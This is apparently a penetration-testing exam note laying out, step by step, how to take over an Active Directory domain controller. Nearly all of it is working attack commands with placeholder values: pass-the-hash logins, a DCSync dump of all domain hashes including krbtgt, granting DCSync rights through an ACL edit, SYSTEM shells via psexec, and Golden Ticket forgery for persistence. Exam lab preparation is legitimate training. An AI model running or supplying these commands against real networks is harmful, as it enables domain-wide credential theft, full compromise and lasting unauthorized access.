# 🎯 DC01 — Exam Solve Guide (Domain)

> The **domain controller** — the graded box. Pattern: pass-the-hash the Domain Admin credential you pulled off MS02 → DCSync the domain → grab proof. Values are placeholders.

Part of [[Active Directory]] · [[AD Attack Framework]]. Prev: [[MS02 — Exam Solve Guide (Lateral)|MS02]] · overview: [[Exam AD Set — Solve Overview]].

```bash
export DC=<DC_IP> DOMAIN=<domain.tld>
echo "$DC DC01.$DOMAIN $DOMAIN" | sudo tee -a /etc/hosts ; sudo ntpdate $DC
```

## 1. Access — pass-the-hash the DA
```bash
nxc smb $DC -u Administrator -H <DA_NTHASH>          # (name:DC01)(DC:True)(Pwn3d!)
evil-winrm -i $DC -u Administrator -H <DA_NTHASH>    # interactive, if you want a shell
```
([[Pass-the-Hash]]) If you only have the DA **password**, use `-u Administrator -p '<pass>'` instead.

## 2. DCSync — dump the domain
```bash
impacket-secretsdump $DOMAIN/Administrator@$DC -hashes :<DA_NTHASH> -just-dc-ntlm
```
Pull **Administrator**, **krbtgt** (golden-ticket capable), and every service/user hash. ([[DCSync & Domain Dominance]])

## 3. Proof
```bash
nxc smb $DC -u Administrator -H <DA_NTHASH> -x "type C:\Users\Administrator\Desktop\proof.txt"
```
Screenshot the flag with the target IP (`ipconfig`) + `whoami` showing `administrator`/SYSTEM in frame ([[Exam Workflow]]).

## ✅ Domain owned
- **krbtgt** hash → Golden Ticket for persistence / any-user access ([[DCSync & Domain Dominance]]).
- Reuse every recovered hash across the whole set — the AD set is one network ([[Credential Reuse]]).
- Submit the DC proof; track changes for [[Post-Engagement Cleanup]].

## 🧩 Real-world problems & fixes

### Pass-the-hash to the DC is refused
`STATUS_LOGON_FAILURE` / `ACCESS_DENIED` almost always means one of:
- **Wrong hash half** — pass the **NT** hash only (`-H <32hex>` or `-hashes :<NT>`), not `LM:NT`.
- **Wrong account** — the hash you pulled may not be the real DA. Re-check *who is Domain Admin* in [[BloodHound]]; try the domain `Administrator` specifically.
- **Local vs domain** — don't use `--local-auth` against the DC; use the domain + FQDN.
- **Clock skew** — `sudo ntpdate $DC`; add the DC FQDN to `/etc/hosts` → [[Credentials Rejected]].

### `secretsdump -just-dc` says "access denied"
Your credential **isn't DA and lacks DCSync** (`GetChanges` + `GetChangesAll`). Options, in order:
- Find a principal that *does* have DCSync in [[BloodHound]] and use it.
- Abuse an **ACL edge** to grant yourself DCSync, then retry ([[AD ACL Abuse]]):
```bash
impacket-dacledit -action write -rights DCSync -principal <you> -target-dn "<BASE_DN>" <dom>/<you>:'<pw>'
```
- You may simply have grabbed the **wrong account** on MS02 — go back and pull the DA from LSASS.

### You have the DA password but NTLM is disabled (Kerberos-only)
Use tickets instead of PtH:
```bash
impacket-getTGT <dom>/Administrator:'<pass>' -dc-ip $DC
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass <dom>/Administrator@DC01.<dom> -just-dc
```
(FQDN + synced clock are mandatory for `-k`.)

### DCSync worked — now I want a shell / the proof on the DC
```bash
impacket-psexec <dom>/Administrator@$DC -hashes :<DA_NTHASH>     # SYSTEM on the DC
evil-winrm -i $DC -u Administrator -H <DA_NTHASH>                # or interactive
```
If `psexec` fails but SMB validated → try `wmiexec`/`smbexec`/`atexec`; confirm the account is actually admin on the DC.

### Golden Ticket rejected
Need the **correct domain SID + krbtgt NT hash**, a synced clock, and the FQDN with `-k`:
```bash
impacket-lookupsid <dom>/Administrator@$DC -hashes :<DA_NTHASH>   # get the domain SID
impacket-ticketer -nthash <krbtgt_NT> -domain-sid <SID> -domain <dom> Administrator
```

### proof.txt isn't where I expected
Check other admin profiles, not just `C:\Users\Administrator\Desktop` — read it without a shell:
```bash
nxc smb $DC -u Administrator -H <DA_NTHASH> -x "type C:\Users\Administrator\Desktop\proof.txt"
```

## 🔑 Exam reminders
- A DA **hash** is enough — **pass it, don't crack it**.
- `-just-dc-ntlm` is the fast path when you only need NTLM for PtH; drop it for full secrets.
- If PtH is refused: verify it's the **NT** hash and the username/format, and that the clock is synced.
